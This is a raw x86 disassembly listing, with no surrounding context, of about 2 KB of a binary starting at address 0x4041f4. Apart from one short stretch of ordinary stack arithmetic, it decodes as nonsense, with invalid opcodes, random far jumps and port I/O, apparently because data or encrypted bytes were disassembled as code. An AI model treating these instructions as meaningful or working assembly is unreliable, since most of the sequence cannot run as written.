  4041f4:	ds pop ds
  4041f6:	sub    al,0xe1
  4041f8:	pop    ds
  4041f9:	dec    edi
  4041fa:	mov    dl,0xb4
  4041fc:	bound  esi,QWORD PTR [eax]
  4041fe:	or     ch,BYTE PTR [ebx]
  404200:	push   cs
  404201:	call   0x3f81:0xabd5e373
  404208:	inc    ebp
  404209:	loope  0x404250
  40420b:	js     0x4041bb
  40420d:	ror    DWORD PTR [edx],0xf6
  404210:	fs stos DWORD PTR es:[edi],eax
  404212:	ror    BYTE PTR [edx-0x28],0x72
  404216:	das    
  404217:	shl    DWORD PTR [esi+0x45247392],0x24
  40421e:	inc    ecx
  40421f:	stos   DWORD PTR es:[edi],eax
  404220:	out    dx,al
  404221:	inc    edx
  404222:	in     al,dx
  404223:	addr16 dec esp
  404225:	xor    al,0x13
  404227:	int3   
  404228:	stos   DWORD PTR es:[edi],eax
  404229:	cmp    BYTE PTR [edi+edi*4-0x6d],0xac
  40422e:	add    eax,0xc0b32c39
  404233:	mov    dh,0xf3
  404235:	sahf   
  404236:	cdq    
  404237:	fdivr  st(1),st
  404239:	xor    esp,DWORD PTR [eax+0x3bbfe339]
  40423f:	in     al,dx
  404240:	out    0x8d,al
  404242:	mov    eax,ds:0x28144240
  404247:	pop    ebp
  404248:	xchg   esi,eax
  404249:	fwait
  40424a:	sbb    edx,ecx
  40424c:	pop    ebp
  40424d:	push   ebx
  40424e:	dec    esi
  40424f:	adc    ecx,ebx
  404251:	pop    es
  404252:	nop
  404253:	and    BYTE PTR es:[edi-0x50],dl
  404257:	mov    cl,0xac
  404259:	lods   eax,DWORD PTR ds:[esi]
  40425a:	das    
  40425b:	stos   BYTE PTR es:[edi],al
  40425c:	push   edi
  40425d:	(bad)  
  40425e:	jecxz  0x4042d6
  404260:	sub    DWORD PTR [ebx],esp
  404262:	adc    DWORD PTR [eax+edx*2-0x78],ecx
  404266:	call   0x6065bbf9
  40426b:	dec    ecx
  40426c:	shl    BYTE PTR [edi],1
  40426e:	std    
  40426f:	mov    dh,BYTE PTR [ecx+ecx*8-0x3a]
  404273:	dec    ebx
  404274:	mov    ecx,0x2d53eb6a
  404279:	inc    ecx
  40427a:	add    eax,0x7b0c8aee
  40427f:	cmp    bl,cl
  404281:	add    ebp,DWORD PTR [ebx-0x3c1951d9]
  404287:	retf   
  404288:	jb     0x404283
  40428a:	iret   
  40428b:	push   edx
  40428c:	jne    0x4042fb
  40428e:	add    edi,DWORD PTR [eax]
  404290:	les    edx,FWORD PTR [esi-0x59]
  404293:	xlat   BYTE PTR ds:[ebx]
  404294:	jge    0x404286
  404296:	pop    eax
  404297:	ins    DWORD PTR es:[edi],dx
  404298:	xor    BYTE PTR [eax-0x64],bl
  40429b:	fadd   DWORD PTR [ebp+0x47]
  40429e:	inc    esp
  40429f:	adc    dl,BYTE PTR [edi]
  4042a1:	jecxz  0x40429c
  4042a3:	fiadd  WORD PTR [edx+0x12]
  4042a6:	mov    esi,DWORD PTR [edi+0xc]
  4042a9:	mov    edx,0x34e7a448
  4042ae:	and    al,0xf8
  4042b0:	adc    ecx,0x57a34e62
  4042b6:	sub    al,bh
  4042b8:	cmp    eax,0x73467004
  4042bd:	scas   al,BYTE PTR es:[edi]
  4042be:	add    DWORD PTR [esi],0xffffff8f
  4042c1:	mov    bl,BYTE PTR [ecx-0x52]
  4042c4:	retw   0x8200
  4042c8:	popa   
  4042c9:	mov    eax,0x4dcf640
  4042ce:	mov    ebx,0xb5d4a33d
  4042d3:	add    al,0xdf
  4042d5:	mov    al,0x11
  4042d7:	push   esi
  4042d8:	inc    ebp
  4042d9:	fwait
  4042da:	popa   
  4042db:	push   edx
  4042dc:	mov    ?,ebx
  4042de:	sbb    ch,BYTE PTR [eax+edi*4-0x38b47e7]
  4042e5:	mov    cl,0xb5
  4042e7:	mov    eax,0x60829fe8
  4042ec:	jae    0x404293
  4042ee:	sub    ebx,DWORD PTR [edx-0x68]
  4042f1:	leave  
  4042f2:	jae    0x404303
  4042f4:	pop    ecx
  4042f5:	inc    esi
  4042f6:	xor    edi,DWORD PTR [edi]
  4042f8:	aaa    
  4042f9:	out    dx,al
  4042fa:	push   ds
  4042fb:	and    eax,0xb85f78a8
  404300:	xor    al,dh
  404302:	call   0xb9f234e9
  404307:	int    0x48
  404309:	add    cl,bh
  40430b:	out    0xbb,al
  40430d:	pop    es
  40430e:	scas   al,BYTE PTR es:[edi]
  40430f:	or     ebx,DWORD PTR [ebx+0x41]
  404312:	push   0xffffff98
  404314:	xchg   edi,eax
  404315:	rcl    DWORD PTR [eax],cl
  404317:	adc    eax,0xe17f4692
  40431c:	inc    eax
  40431d:	xchg   DWORD PTR [eax-0x4e],edi
  404320:	mov    edx,0xa17bfa8c
  404325:	sahf   
  404326:	jns    0x404311
  404328:	inc    edx
  404329:	pop    ecx
  40432a:	push   ebx
  40432b:	enter  0x670,0x82
  40432f:	fs and al,0x1d
  404332:	shr    DWORD PTR ds:0xf65520bf,cl
  404338:	leave  
  404339:	xlat   BYTE PTR ds:[ebx]
  40433a:	pushf  
  40433b:	xor    dh,BYTE PTR ds:0xa8718f5c
  404341:	cmp    BYTE PTR [ecx+0x6989a23e],dl
  404347:	mov    bh,BYTE PTR [edx+0x760c53b8]
  40434d:	jnp    0x40435d
  40434f:	dec    esp
  404350:	push   0x7d59ef64
  404355:	fidiv  WORD PTR [eax]
  404357:	(bad)  
  404358:	xchg   ecx,eax
  404359:	cwde   
  40435a:	xchg   ecx,eax
  40435b:	and    eax,0x9f51ed6
  404360:	cmp    eax,0xe6adc6dd
  404365:	jle    0x4042ec
  404367:	ja     0x404394
  404369:	jmp    0xbe3c:0xd988baa8
  404370:	push   ebx
  404371:	int    0x95
  404373:	iret   
  404374:	(bad)  [ecx+edi*8]
  404377:	hlt    
  404378:	mov    ebp,0xc91edbd2
  40437d:	out    dx,al
  40437e:	(bad)  
  40437f:	push   ds
  404380:	xlat   BYTE PTR ds:[ebx]
  404381:	add    BYTE PTR ds:0x29501a90,0x68
  404388:	dec    ebp
  404389:	sar    DWORD PTR [ebx+0x3cb3545c],1
  40438f:	ret    
  404390:	(bad)  
  404391:	lea    eax,[ecx-0x7c]
  404394:	and    eax,0x7b8f1331
  404399:	cmc    
  40439a:	(bad)  
  40439b:	mov    ch,0x38
  40439d:	xor    ebp,DWORD PTR [eax+0x4a2cb369]
  4043a3:	stc    
  4043a4:	inc    edx
  4043a5:	ds jb  0x40432a
  4043a8:	arpl   WORD PTR [esi],di
  4043aa:	loopne 0x4043d5
  4043ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ad:	les    ebp,FWORD PTR [ebx]
  4043af:	jle    0x40434c
  4043b1:	dec    esp
  4043b2:	pop    eax
  4043b3:	sbb    eax,0xc9717820
  4043b8:	push   edx
  4043b9:	add    BYTE PTR [eax-0x10],bh
  4043bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043bd:	push   cs
  4043be:	lods   eax,DWORD PTR ds:[esi]
  4043bf:	(bad)  
  4043c0:	pushf  
  4043c1:	fnstcw WORD PTR [ecx]
  4043c3:	add    ah,ah
  4043c5:	js     0x40434b
  4043c7:	ins    BYTE PTR es:[edi],dx
  4043c8:	pcmpgtd mm0,QWORD PTR [ebx]
  4043cb:	jmp    0x2c98ae0a
  4043d0:	fnstcw WORD PTR fs:[ebx+0x78]
  4043d4:	aam    0x1c
  4043d6:	mov    edi,ds
  4043d8:	jbe    0x404437
  4043da:	xchg   esp,eax
  4043db:	(bad)  [ecx+0x7a]
  4043de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043df:	pop    esp
  4043e0:	or     esi,DWORD PTR [ecx+0x77f0502e]
  4043e6:	sub    eax,0xfb4c5eb0
  4043eb:	mov    dl,0x5
  4043ed:	ret    0x7c4e
  4043f0:	outs   dx,DWORD PTR ds:[esi]
  4043f1:	inc    esp
  4043f2:	mov    edi,0xd3863d7f
  4043f7:	push   edx
  4043f8:	ret    0x3267
  4043fb:	das    
  4043fc:	mov    eax,0x77a52712
  404401:	pop    ebp
  404402:	icebp  
  404403:	jne    0x40443b
  404405:	pop    ebx
  404406:	loopne 0x404407
  404408:	in     eax,dx
  404409:	aaa    
  40440a:	push   ss
  40440b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40440c:	stc    
  40440d:	ror    cl,0xd
  404410:	xor    al,0x90
  404412:	daa    
  404413:	data16 mov ch,0xa2
  404416:	das    
  404417:	mov    al,ds:0xc7bd1a41
  40441c:	(bad)  
  40441d:	clc    
  40441e:	repz loope 0x4043f2
  404421:	call   0xbbd6:0x9d371f30
  404428:	test   eax,0x4079913c
  40442d:	jo     0x40444c
  40442f:	test   al,0x31
  404431:	mov    ds:0x4f820189,al
  404436:	dec    ebp
  404437:	fsub   QWORD PTR [edx-0x3b]
  40443a:	pop    ds
  40443b:	aaa    
  40443c:	pusha  
  40443d:	int3   
  40443e:	jmp    0x40447c
  404440:	nop
  404441:	iret   
  404442:	sbb    bl,BYTE PTR ds:0x378b46f4
  404448:	adc    ch,0x9d
  40444b:	cmp    BYTE PTR [eax],ch
  40444d:	mov    ds:0x50f89707,eax
  404452:	jo     0x4044c7
  404454:	out    dx,eax
  404455:	mov    ds:0x85638ff0,al
  40445a:	fucomip st,st(7)
  40445c:	adc    DWORD PTR ds:[edi+eiz*2-0x55],edx
  404461:	dec    esp
  404462:	push   edx
  404463:	jg     0x40441e
  404465:	test   DWORD PTR [ecx-0x38],ecx
  404468:	cmp    bl,bh
  40446a:	or     DWORD PTR [esi-0x67],edi
  40446d:	dec    esi
  40446e:	push   ebp
  40446f:	push   ds
  404470:	fiadd  WORD PTR [esi-0x2e]
  404473:	aad    0x67
  404475:	jmp    0xb565805
  40447a:	and    DWORD PTR [edi-0x11607cd],ebx
  404480:	add    al,BYTE PTR [eax]
  404482:	add    BYTE PTR [edx],al
  404484:	pop    ebp
  404485:	inc    esp
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044bd
  404490:	fistp  DWORD PTR [eax-0x4f]
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x40446e
  40449c:	fnstenv [edx-0x3c]
  40449f:	fs pop esp
  4044a1:	push   edi
  4044a2:	xor    al,BYTE PTR [edx]
  4044a4:	(bad)  
  4044a5:	jmp    0x1d246de1
  4044aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ab:	push   edx
  4044ac:	jp     0x4044ed
  4044ae:	ins    DWORD PTR es:[edi],dx
  4044af:	mov    ecx,DWORD PTR [edi+0x389829b5]
  4044b5:	sbb    eax,0x7b6a11e8
  4044ba:	push   ds
  4044bb:	loop   0x404529
  4044bd:	mov    ecx,0x9e6785a7
  4044c2:	pusha  
  4044c3:	ins    BYTE PTR es:[edi],dx
  4044c4:	jp     0x40444c
  4044c6:	leave  
  4044c7:	dec    BYTE PTR [ebp-0x31e67575]
  4044cd:	add    cl,ch
  4044cf:	imul   edi,DWORD PTR [esi-0x77b2e257],0x2a
  4044d6:	rol    BYTE PTR ds:0xd7e00b90,0xd6
  4044dd:	xor    eax,0x3a8efdf4
  4044e2:	in     al,0x91
  4044e4:	inc    eax
  4044e5:	jmp    0xf053d4a6
  4044ea:	dec    ebp
  4044eb:	and    al,0xd
  4044ed:	mov    ebx,0x8a4f2a99
  4044f2:	xchg   BYTE PTR [ebx+0x6b],bh
  4044f5:	aam    0xa6
  4044f7:	fmul   DWORD PTR [ebp+0x2c39c590]
  4044fd:	mov    dh,0x20
  4044ff:	repnz sbb DWORD PTR [edx+0x514cbc95],esp
  404506:	shr    ch,0x4f
  404509:	ds jne 0x404582
  40450c:	push   edi
  40450d:	mov    dh,0xce
  40450f:	pop    esi
  404510:	enter  0xebb5,0xc5
  404514:	xchg   ah,al
  404516:	call   0xfe69377
  40451b:	jl     0x4044dd
  40451d:	pcmpeqb mm5,mm2
  404520:	scas   eax,DWORD PTR es:[edi]
  404521:	cdq    
  404522:	push   ecx
  404523:	or     DWORD PTR [ebp-0x6b],0x896d7f3e
  40452a:	sub    ecx,DWORD PTR [ecx+0x69ed5f0f]
  404530:	or     BYTE PTR [ebp+0x59],ch
  404533:	sub    DWORD PTR [ebp-0x74c9e267],esi
  404539:	test   DWORD PTR [eax],esi
  40453b:	cmp    BYTE PTR [esi+eiz*2+0x4e],bl
  40453f:	inc    edx
  404540:	mov    eax,DWORD PTR [eax]
  404542:	(bad)  
  404543:	int    0xd1
  404545:	or     BYTE PTR [ecx-0x4384267e],dl
  40454b:	sub    al,0xcd
  40454d:	shl    DWORD PTR [ebp-0x25ec6370],1
  404553:	and    dh,BYTE PTR [ebx]
  404555:	jb     0x4045b9
  404557:	pop    eax
  404558:	repnz pop ebp
  40455a:	jnp    0x404583
  40455c:	pusha  
  40455d:	adc    eax,0xf3ed8850
  404562:	cmp    BYTE PTR [ecx],ch
  404564:	dec    ecx
  404565:	loope  0x40457f
  404567:	inc    ebx
  404568:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40456a:	jp     0x404536
  40456c:	ja     0x404573
  40456e:	jmp    0x40459d
  404570:	add    eax,0x16538f28
  404575:	inc    esp
  404576:	pop    di
  404578:	mov    dl,0x41
  40457a:	call   0x947c:0xcd772a50
  404581:	retf   0x83c3
  404584:	pop    ss
  404585:	aad    0x43
  404587:	and    DWORD PTR [esi],0x10
  40458a:	add    al,0xee
  40458c:	mov    esi,0x94ed8300
  404591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404592:	fdivr  QWORD PTR [ebx]
  404594:	shr    BYTE PTR [ecx+ebx*1-0x3ab076c4],1
  40459b:	mov    al,ds:0x25ca44b7
  4045a0:	adc    ebx,esp
  4045a2:	(bad)  
  4045a4:	jns    0x40452c
  4045a6:	ins    DWORD PTR es:[edi],dx
  4045a7:	leave  
  4045a8:	mov    ss,WORD PTR [eax+0x6aef9bf0]
  4045ae:	mov    bh,0x63
  4045b0:	xchg   ebx,eax
  4045b1:	dec    esp
  4045b2:	and    al,0xa3
  4045b4:	lods   al,BYTE PTR cs:[esi]
  4045b6:	data16 sahf 
  4045b8:	ficomp DWORD PTR [ebx+0x20]
  4045bb:	and    eax,0xcc1d9ab8
  4045c0:	push   cs
  4045c1:	or     eax,0x86f9289a
  4045c6:	xlat   BYTE PTR ds:[ebx]
  4045c7:	push   edi
  4045c8:	dec    esp
  4045c9:	cmp    bh,al
  4045cb:	rol    al,cl
  4045cd:	cwde   
  4045ce:	in     eax,dx
  4045cf:	(bad)  
  4045d1:	pop    edx
  4045d2:	add    DWORD PTR [edi-0x1e41ce4b],esp
  4045d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d9:	stos   DWORD PTR es:[edi],eax
  4045da:	dec    edx
  4045db:	outs   dx,DWORD PTR ds:[esi]
  4045dc:	cli    
  4045dd:	cmp    eax,0xa45b5ac3
  4045e2:	lea    esi,es:[edi+0x20843d1]
  4045e9:	(bad)  
  4045ea:	cmp    DWORD PTR [ebx+0x478d6279],ecx
  4045f0:	inc    ebx
  4045f1:	jmp    0xd50221b9
  4045f6:	std    
  4045f7:	mov    esi,0x30130c2e
  4045fc:	jmp    0x3e10cbd7
  404601:	sahf   
  404602:	mov    eax,ds:0x7a78728f
  404607:	je     0x404644
  404609:	jp     0x404663
  40460b:	sahf   
  40460c:	pop    ds
  40460d:	inc    ebp
  40460e:	sub    BYTE PTR [ecx+eiz*1],0x68
  404612:	arpl   WORD PTR [ecx+0xab053f5],bx
  404618:	ja     0x40468b
  40461a:	mov    ecx,DWORD PTR fs:0x5f85e1fd
  404621:	cmp    eax,0x8a68e654
  404626:	popa   
  404627:	adc    DWORD PTR [ebx+0x4b],eax
  40462a:	aam    0x99
  40462c:	add    al,0x26
  40462e:	fld    QWORD PTR [edi-0x6c]
  404631:	(bad)  
  404632:	clc    
  404633:	push   esp
  404634:	inc    dh
  404636:	add    al,0x74
  404638:	sub    DWORD PTR [ebx+0x6dd35d73],0xffffffc2
  40463f:	xchg   esi,eax
  404640:	ja     0x404655
  404642:	xor    dh,BYTE PTR [eax-0x6c]
  404645:	std    
  404646:	ins    DWORD PTR es:[edi],dx
  404647:	and    BYTE PTR [edx],0xa3
  40464a:	test   eax,0xaa5c1399
  40464f:	sub    bh,BYTE PTR [edx-0x58]
  404652:	int    0xe
  404654:	out    0xa1,al
  404656:	mov    edi,0xd00558fb
  40465b:	push   es
  40465c:	out    0x58,al
  40465e:	push   ebp
  40465f:	rcr    DWORD PTR [ecx+eax*8+0x640a8052],1
  404666:	ret    
  404667:	popa   
  404668:	aaa    
  404669:	scas   al,BYTE PTR es:[edi]
  40466a:	fdivr  QWORD PTR [edi+0x305887bb]
  404670:	mov    al,0xaf
  404672:	cmp    eax,0x3a55a2ff
  404677:	inc    ebp
  404678:	cmc    
  404679:	dec    ebx
  40467a:	xchg   esi,eax
  40467b:	loop   0x404648
  40467d:	mov    bh,0x6d
  40467f:	into   
  404680:	cmp    DWORD PTR [edx],edi
  404682:	das    
  404683:	mov    al,0x86
  404685:	adc    bl,ah
  404687:	int    0x10
  404689:	xchg   DWORD PTR [esi-0x79],esi
  40468c:	xchg   al,ch
  40468e:	jecxz  0x404708
  404690:	xor    ebx,0x23
  404693:	rol    ebx,cl
  404695:	mov    esp,0xade9e632
  40469a:	cmp    BYTE PTR [edi-0x57],ch
  40469d:	scas   al,BYTE PTR es:[edi]
  40469e:	aam    0x97
  4046a0:	push   ds
  4046a1:	push   es
  4046a2:	xchg   esi,eax
  4046a3:	inc    edi
  4046a4:	sub    ch,al
  4046a6:	pop    ss
  4046a7:	inc    esi
  4046a8:	add    DWORD PTR [esi-0x2e9927f8],0x6e269e79
  4046b2:	xor    BYTE PTR [edx+0x22],al
  4046b5:	mov    ebp,0x8a8d1ead
  4046ba:	mov    eax,0x56cb396d
  4046bf:	dec    ebp
  4046c0:	imul   esi,esi,0x60bbaab0
  4046c6:	adc    al,0x67
  4046c8:	cmc    
  4046c9:	jp     0x4046b4
  4046cb:	js     0x4046ab
  4046cd:	mov    dl,0xb8
  4046cf:	data16 fstp DWORD PTR ds:0x35e657b3
  4046d6:	popa   
  4046d7:	cld    
  4046d8:	adc    cl,dl
  4046da:	lods   al,BYTE PTR ds:[esi]
  4046db:	mov    ds:0x2f164e10,al
  4046e1:	popa   
  4046e2:	mov    WORD PTR [edi+0xb902c21],gs
  4046e8:	xchg   edx,esi
  4046ea:	or     BYTE PTR [edi+0x5],ch
  4046ed:	and    eax,0xbaba7382
  4046f2:	pop    ds
  4046f3:	sbb    al,0x3d
  4046f5:	sub    BYTE PTR [ebp-0x1],cl
  4046f8:	dec    ebp
  4046f9:	mov    esi,0x1125192b
  4046fe:	push   0x8690c7c
  404703:	inc    ebx
  404704:	jne    0x40473b
  404706:	call   0x31db4db8
  40470b:	sbb    DWORD PTR [eax-0x77],0x55
  40470f:	mov    eax,ds:0x9eadf740
  404714:	mov    esp,fs
  404716:	adc    eax,DWORD PTR ds:0xbafa0d8c
  40471c:	xchg   ebp,eax
  40471d:	retf   
  40471e:	dec    eax
  40471f:	ret    0x3182
  404722:	jmp    0xb508:0x7fe7c94b
  404729:	rcr    ebx,cl
  40472b:	adc    dh,bl
  40472d:	test   al,0x74
  40472f:	jo     0x40478d
  404731:	pusha  
  404732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404733:	(bad)  
  404734:	jb     0x4047a6
  404736:	icebp  
  404737:	cmp    eax,0x4fe361a5
  40473c:	shr    BYTE PTR [esi],cl
  40473e:	or     ch,BYTE PTR [eax+ebx*4]
  404741:	stos   DWORD PTR es:[edi],eax
  404742:	iret   
  404743:	pop    esi
  404744:	jle    0x4047b2
  404746:	mov    edx,0x2ec917d
  40474b:	or     edx,DWORD PTR [eax+0x7]
  40474e:	lea    ecx,[esi-0x70fb634c]
  404754:	jl     0x40471d
  404756:	mov    edx,0x4fc21fb3
  40475b:	shl    DWORD PTR [esi],1
  40475d:	(bad)
  404760:	loope  0x40475d
  404762:	dec    eax
  404763:	es sub bh,dl
  404766:	adc    edi,DWORD PTR [ebp+0x450298a7]
  40476c:	stc    
  40476d:	dec    edx
  40476e:	aas    
  40476f:	mov    BYTE PTR ss:[ebx+0x6c],cl
  404773:	sub    BYTE PTR [edx+esi*8],bh
  404776:	push   ebp
  404777:	mov    BYTE PTR [ebx-0x57],dh
  40477a:	push   0x74
  40477c:	mov    al,0x60
  40477e:	and    eax,0xd03360f4
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	ret    
  4047b5:	and    al,BYTE PTR [edx+0x7e27b8e3]
  4047bb:	jle    0x404815
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404796
  4047c1:	add    ch,BYTE PTR [ecx]
  4047c3:	push   esp
  4047c4:	push   eax
  4047c5:	ins    BYTE PTR es:[edi],dx
  4047c6:	add    eax,edi
  4047c8:	mov    eax,0x20b03242
  4047cd:	repnz cli 
  4047cf:	dec    edi
  4047d0:	xor    eax,0xfd74d745
  4047d5:	leave  
  4047d6:	call   0xafe7:0x82989933
  4047dd:	jnp    0x404763
  4047df:	mov    ds:0x99a935e9,al
  4047e4:	push   edi
  4047e5:	pop    esp
  4047e6:	jp     0x404772
  4047e8:	and    bl,BYTE PTR [ecx-0x4a]
  4047eb:	fmul   DWORD PTR [edi+0x2b]
  4047ee:	test   al,0xd1
  4047f0:	push   esi
  4047f1:	vpinsrb ymm2{k5},(bad),BYTE PTR [eax+0x35e35162],0xe
  4047fc:	add    BYTE PTR [esi+0x12],bh
  4047ff:	mov    cl,0xa1
  404801:	jg     0x404851
  404803:	cs (bad) 
  404805:	mov    ds:0xb15c3df4,al
  40480a:	jl     0x4047ca
  40480c:	xlat   BYTE PTR ds:[ebx]
  40480d:	aad    0x55
  40480f:	xor    BYTE PTR [ebp-0x4fa1c579],al
  404815:	lods   al,BYTE PTR ds:[esi]
  404816:	push   ds
  404817:	or     edx,edi
  404819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40481a:	push   ebx
  40481b:	push   ds
  40481c:	inc    edi
  40481d:	inc    edx
  40481e:	popf   
  40481f:	xor    ecx,DWORD PTR [ecx]
  404821:	pop    esi
  404822:	outs   dx,DWORD PTR ds:[esi]
  404823:	(bad)  
  404824:	shl    BYTE PTR [esi+0x55],cl
  404827:	sub    eax,0x32db2e07
  40482c:	fdiv   QWORD PTR [ecx]
  40482e:	mov    esp,0x539182f3
  404833:	(bad)  
  404834:	cli    
  404835:	fsubr  QWORD PTR [esi+0x48ffd275]
  40483b:	mov    edi,0x59427900
  404841:	push   ebx
  404842:	fist   WORD PTR [edi]
  404844:	xlat   BYTE PTR ds:[ebx]
  404845:	pop    ss
  404846:	ss (bad) 
  404848:	in     eax,dx
  404849:	out    dx,ax
  40484b:	dec    ebx
  40484c:	dec    esi
  40484d:	xor    bh,bh
  40484f:	push   esi
  404850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404851:	pop    es
  404852:	inc    esi
  404853:	hlt    
  404854:	fidiv  DWORD PTR [edi-0x205e4d04]
  40485a:	sbb    eax,0x23abf8c4
  40485f:	and    eax,0x4cc70e06
  404864:	in     eax,dx
  404865:	cmp    esp,edi
  404867:	mov    bl,BYTE PTR [edx-0x46]
  40486a:	inc    edi
  40486b:	rcr    al,cl
  40486d:	in     eax,0x1a
  40486f:	inc    esp
  404870:	dec    ebp
  404871:	rol    BYTE PTR [esi],0x1
  404874:	movq   QWORD PTR [ecx],mm3
  404877:	sbb    al,0x86
  404879:	lock fisttp DWORD PTR [esi-0x2a]
  40487d:	(bad)
  404880:	(bad)  
  404881:	rol    DWORD PTR ds:0x801b81da,1
  404887:	dec    edx
  404888:	out    dx,al
  404889:	mov    al,ds:0x6f4dc6f
  40488e:	mov    al,0x8e
  404890:	mov    esi,0x362024f5
  404895:	pop    eax
  404896:	cli    
  404897:	add    al,0x73
  404899:	inc    edi
  40489a:	jecxz  0x4048df
  40489c:	into   
  40489d:	jle    0x404846
  40489f:	mov    dl,0xd1
  4048a1:	fidiv  DWORD PTR [ebx]
  4048a3:	inc    eax
  4048a4:	or     BYTE PTR [edx],cl
  4048a6:	cmp    dh,dh
  4048a8:	rcl    BYTE PTR [eax+0x77],cl
  4048ab:	mov    ah,0xe5
  4048ad:	mov    ds:0x73d6607c,al
  4048b2:	lahf   
  4048b3:	ss sti 
  4048b5:	mov    cl,BYTE PTR [eax]
  4048b7:	ds cs leave 
  4048ba:	add    eax,0x53a5e011
  4048bf:	lahf   
  4048c0:	inc    ebp
  4048c1:	pop    edi
  4048c2:	push   esi
  4048c3:	xor    eax,0xdf62ed2a
  4048c8:	jne    0x404852
  4048ca:	cmovae esi,DWORD PTR fs:[ecx]
  4048ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d0:	loop   0x40494a
  4048d2:	cmp    edi,DWORD PTR [esi]
  4048d4:	lock adc DWORD PTR [ecx-0x653beb75],edx
  4048db:	std    
  4048dc:	js     0x4048e6
  4048de:	mov    eax,ds:0xfb1ae381
  4048e3:	int3   
  4048e4:	pop    esi
  4048e5:	les    esi,FWORD PTR ds:0x11a840fd
  4048eb:	retf   
  4048ec:	cmp    DWORD PTR [eax],0x8ef3be15
  4048f2:	xor    eax,0x29de1dbd
  4048f7:	lea    esp,[edi]
  4048f9:	stos   DWORD PTR es:[edi],eax
  4048fa:	(bad)  
  4048fb:	out    dx,eax
  4048fc:	sbb    DWORD PTR [ecx+0x5a],esi
  4048ff:	mov    ecx,ecx
  404901:	adc    dh,BYTE PTR [esi-0x23a8281f]
  404907:	add    al,0xcf
  404909:	sub    edi,DWORD PTR [ebx]
  40490b:	(bad)  
  40490c:	(bad)  
  40490d:	std    
  40490e:	pop    ds
  40490f:	inc    edx
  404910:	iret   
  404911:	(bad)  
  404912:	cmp    DWORD PTR [esp+esi*8],eax
  404915:	cmp    BYTE PTR [edi+0x45],bh
  404918:	xor    edx,ebx
  40491a:	aam    0xb8
  40491c:	lock adc bl,BYTE PTR [edx+edi*4]
  404920:	in     al,0x7c
  404922:	mov    ecx,0xb9ae7f49
  404927:	fisttp QWORD PTR [edi-0x56c7336d]
  40492d:	xchg   esi,eax
  40492e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40492f:	push   si
  404931:	pop    ecx
  404932:	sbb    esp,DWORD PTR [eax+0x17b543f6]
  404938:	xchg   DWORD PTR [edx],ebx
  40493a:	mov    dh,0x6e
  40493c:	out    0x47,al
  40493e:	pop    edx
  40493f:	out    0xec,al
  404941:	fs pop ecx
  404943:	cdq    
  404944:	sbb    al,0x19
  404946:	cmp    eax,0xdf697dce
  40494b:	jns    0x404974
  40494d:	mov    fs,WORD PTR [edi]
  40494f:	sub    al,0x5a
  404951:	sub    al,0x46
  404953:	jecxz  0x4049d0
  404955:	mov    ebp,0x1583a1c0
  40495a:	adc    eax,ecx
  40495c:	leave  
  40495d:	push   cs
  40495e:	push   ecx
  40495f:	jl     0x404946
  404961:	stos   BYTE PTR es:[edi],al
  404962:	sahf   
  404963:	mov    ds:0xdb4fcd60,eax
  404968:	daa    
  404969:	xor    al,BYTE PTR [ecx+0x1b]
  40496c:	jge    0x404934
  40496e:	ins    DWORD PTR es:[edi],dx
  40496f:	mov    bh,BYTE PTR ds:[esi+0x78d7a1cb]
  404976:	and    eax,0xa0372b49
  40497b:	dec    eax
  40497c:	div    DWORD PTR [edi]
  40497e:	imul   edi,DWORD PTR [ebp-0x6a85c6f1],0x7f
  404985:	mov    esi,0xa95016f0
  40498a:	pushf  
  40498b:	or     eax,0xbb6c4868
  404990:	mov    eax,0x3ba01009
  404995:	inc    edx
  404996:	mov    ?,WORD PTR [eax+0x71]
  404999:	into   
  40499a:	inc    edx
  40499b:	sub    eax,0xc82e12b9
  4049a0:	in     al,0xfc
  4049a2:	xor    DWORD PTR [ecx],esi
  4049a4:	enter  0xb026,0x8
  4049a8:	outs   dx,DWORD PTR ds:[esi]
  4049a9:	mov    bh,0xf9
  4049ab:	shr    BYTE PTR [edi],1
  4049ad:	xchg   ebx,eax
  4049ae:	cmp    eax,esi
  4049b0:	ficomp DWORD PTR [edi-0x5c460036]
  4049b6:	xchg   esp,eax
  4049b7:	jne    0x404a12
  4049b9:	sub    DWORD PTR [edx+0x72],esp
  4049bc:	adc    DWORD PTR [edi-0x4483713f],0xf7273eeb
  4049c6:	mov    al,0xfd
  4049c8:	adc    al,0x26
  4049ca:	and    al,0x47
  4049cc:	mov    DWORD PTR [ebx+0x68],ecx
  4049cf:	rcl    DWORD PTR [ebp-0x6432c3d],1
  4049d5:	adc    eax,0xabfeb853
  4049da:	shl    DWORD PTR [ebp-0xe],1
  4049dd:	add    eax,0x431f69c6
  4049e2:	or     ebx,DWORD PTR [ecx-0x1f]
  4049e5:	inc    edi
